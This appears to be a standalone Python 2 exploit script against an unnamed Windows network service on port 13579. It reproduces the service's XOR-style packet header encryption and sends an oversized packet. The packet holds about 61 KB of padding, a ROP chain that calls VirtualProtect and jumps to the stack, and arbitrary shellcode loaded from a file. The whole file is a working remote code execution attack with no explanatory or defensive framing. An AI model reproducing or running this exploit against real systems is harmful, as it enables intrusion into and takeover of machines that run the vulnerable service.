#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import struct
import sys
import time

def p16(addr, sign="unsigned"):
    fmt = "<H"
    if sign == "signed":
        fmt = "<h"
    return struct.pack(fmt, addr)

def p32(addr, sign="unsigned"):
    fmt = "<I"
    if sign == "signed":
        fmt = "<i"
    return struct.pack(fmt, addr)

def info(msg):
    print "[*]{}".format(msg)

def success(msg):
    print "[+]{}".format(msg)

def error(msg):
    print "[!]{}".format(msg)
    exit(1)

def encrypt(key, data):
    ret = ""
    key0 = key1 = key2 = key3 = key

    for ch in data:
        key0 = (key0 + (((key0 >> 3) & 0xffffffff) - 0x11111111) & 0xffffffff) & 0xffffffff
        key1 = (key1 + (((key1 >> 5) & 0xffffffff) - 0x22222222) & 0xffffffff) & 0xffffffff
        key2 = (key2 + (0x44444444 - ((key2 << 9) & 0xffffffff)) & 0xffffffff) & 0xffffffff
        key3 = (key3 + (0x33333333 - ((key3 << 7) & 0xffffffff)) & 0xffffffff) & 0xffffffff
        new_key = (((key2 & 0xff) + (key3 & 0xff) + (key1 & 0xff) + (key0 & 0xff)) & 0xff)
        res = struct.unpack("<B", ch)[0] ^ new_key
        ret += struct.pack("<B", res)
    
    return ret

def exploit(host, port, shellcode):
    padding_length = 0xf008
    call_ebp = 0x004045c4
    key = 0xdeadbeef

    rop_chain = ""
    rop_chain += p32(0x004fc251)        # POP EAX # RETN
    rop_chain += p32(0x0056D39C)        # &VirtualProtect()
    rop_chain += p32(0x00403b23)        # MOV EAX, [EAX] # RETN
    rop_chain += p32(0x004d1096)        # XCHG EAX,ESI # RETN
    rop_chain += p32(0x0048dfe6)        # POP EBP # RETN
    rop_chain += p32(0x0043c3d7)        # & jmp esp
    rop_chain += p32(0x004efad5)        # POP EBX # RETN
    rop_chain += p32(0x00000400)        # ebx
    rop_chain += p32(0x004b2798)        # POP EDX # RETN
    rop_chain += p32(0x00000040)        # edx
    rop_chain += p32(0x00405aa7)        # POP ECX # RETN 0x08
    rop_chain += p32(0x00571cfd)        # &Writable location
    rop_chain += p32(0x00403159)        # POP EDI # RETN
    rop_chain += p32(0x41414141)        # padding
    rop_chain += p32(0x41414141)        # padding
    rop_chain += p32(0x0047d25f)        # RETN (ROP NOP)
    rop_chain += p32(0x004fc251)        # POP EAX # RETN
    rop_chain += p32(0x90909090)        # nop
    rop_chain += p32(0x0054021f)        # PUSHAD # RETN

    pktlen = padding_length + len(rop_chain) + len(shellcode)
    hdr = encrypt(key, p32(key) + p32(0) + p16(pktlen) + p16(pktlen) + p32(0))
    pkt = p32(key) + hdr[4:] + "A" * padding_length + rop_chain + shellcode

    sd = socket.socket()
    try:
        info("try to connect to {}:{}".format(host, port))
        sd.connect((host, port))
        info("sending paylaod...")
        sd.send(pkt)
        time.sleep(0.5)
        success("done")
        sd.close()
    except Exception as ex:
        print error(ex)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        error("Usage: {} 127.0.0.1 13579 shellcode.bin".format(sys.argv[0]))

    try:
        with open(sys.argv[3], "rb") as fd:
            host, port = sys.argv[1], int(sys.argv[2])
            shellcode = fd.read()
            exploit(host, port, shellcode)
    except Exception as ex:
        error(ex)
